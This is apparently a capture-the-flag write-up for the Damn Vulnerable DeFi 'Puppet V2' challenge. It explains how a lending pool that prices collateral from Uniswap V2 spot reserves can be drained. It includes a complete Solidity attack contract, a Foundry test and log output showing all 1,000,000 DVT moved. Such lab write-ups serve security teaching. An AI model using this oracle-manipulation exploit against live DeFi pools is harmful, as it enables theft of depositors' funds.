# Challenge - Puppet V2

The developers of the previous pool seem to have learned the lesson. And released a new version.

Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn’t that be enough?

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!

## Objective of CTF

Save all funds from the pool, depositing them into the designated recovery account.

## Vulnerability Analysis

### Root Cause: Price Manipulation

The lending pool allows user to borrow the DVT tokens. The amount that can be borrowed is determined by the amount of collateral (e.g. WETH) deposited:

```solidity
function borrow(uint256 borrowAmount) external {
    // Calculate how much WETH the user must deposit
    uint256 amount = calculateDepositOfWETHRequired(borrowAmount);

    // Take the WETH
    _weth.transferFrom(msg.sender, address(this), amount);

    // internal accounting
    deposits[msg.sender] += amount;

    require(_token.transfer(msg.sender, borrowAmount), "Transfer failed");

    emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp);
}
```

The key to the exploit lies in the `calculateDepositOfWETHRequired()` function, which calculates the required WETH deposit based on the reserves of WETH and DVT tokens in a Uniswap V2 pair. However, these reserves can be easily manipulated through token swaps:

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}
```

From the `_getOracleQuote` formula, it’s clear that lowering the oracle price requires increasing the tokenA reserve (e.g. DVT token) and decreasing the tokenB reserve (e.g. WETH token) in the `uniswapV2Pair`. We can achieve this by calling the `swapExactTokensForTokens()` function in the `UniswapV2Router02` contract, allowing us to swap WETH for the DVT tokens and manipulate the price.

```solidity
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

The `quote()` function from Uniswap V2 calculates the amount of WETH required based on the reserves:

```solidity
function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {
    require(amountA > 0, "UniswapV2Library: INSUFFICIENT_AMOUNT");
    require(reserveA > 0 && reserveB > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
    amountB = amountA * reserveB / reserveA;
}
```

### Attack steps:

1. Swap out most of the WETH for DVT tokens in the Uniswap V2 pair to significantly lower the DVT token price.
2. Borrow the maximum amount of DVT tokens from the lending pool, since the collateral requirement is now undervalued.
3. Transfer the rescued token to the `recovery` address.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Ownable} from "solady/auth/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPuppetPoolV2 {
    function borrow(uint256 borrowAmount) external;
}

interface IUniswapV2Router01 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract AttackPuppetV2 is Ownable {
    address private immutable uniswapPair;
    address private immutable lendingPool;
    address private immutable router;
    address private immutable token;
    address private immutable weth;
    address private immutable recovery;

    constructor(
        address _uniswapPair,
        address _lendingPool,
        address _router,
        address _token,
        address _weth,
        address _recovery
    ) payable {
        _initializeOwner(msg.sender);

        uniswapPair = _uniswapPair;
        lendingPool = _lendingPool;
        router = _router;
        token = _token;
        weth = _weth;
        recovery = _recovery;
    }

    function attack(uint256 amountIn, uint256 amountOutMin) external onlyOwner {
        IERC20(token).approve(router, amountIn);

        // swap Token to WETH
        address[] memory path;
        path = new address[](2);
        path[0] = token;
        path[1] = weth;
        IUniswapV2Router01(router).swapExactTokensForTokens(
            amountIn, amountOutMin, path, address(this), block.timestamp
        );

        // borrow all tokens in PuppetV2 by weth
        uint256 wethBalance = IERC20(weth).balanceOf(address(this));
        uint256 tokenBalance = IERC20(token).balanceOf(lendingPool);
        IERC20(weth).approve(lendingPool, wethBalance);
        IPuppetPoolV2(lendingPool).borrow(tokenBalance);

        // transfer all the rescued tokens to recovery address
        IERC20(token).transfer(recovery, tokenBalance);
    }
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {AttackPuppetV2} from "../../src/puppet-v2/AttackPuppetV2.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the lendingPool contract", token.balanceOf(address(lendingPool)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );

        AttackPuppetV2 maliciousContract = new AttackPuppetV2(
            address(uniswapV2Exchange),
            address(lendingPool),
            address(uniswapV2Router),
            address(token),
            address(weth),
            recovery
        );

        uint256 amount = 19.9 ether; // leave some ether to pay eth
        weth.deposit{value: amount}();
        weth.transfer(address(maliciousContract), amount);
        token.transfer(address(maliciousContract), PLAYER_INITIAL_TOKEN_BALANCE);

        maliciousContract.attack(PLAYER_INITIAL_TOKEN_BALANCE, 9.9 ether);

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the lendingPool contract", token.balanceOf(address(lendingPool)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
```

### Test Result

```
Ran 2 tests for test/puppet-v2/PuppetV2.t.sol:PuppetV2Challenge
[PASS] test_assertInitialState() (gas: 50384)
[PASS] test_puppetV2() (gas: 838660)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the lendingPool contract: 1000000.000000000000000000
  token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the lendingPool contract: 0.000000000000000000
  token balance in the recovery address: 1000000.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 13.98ms (2.73ms CPU time)

Ran 1 test suite in 246.15ms (13.98ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
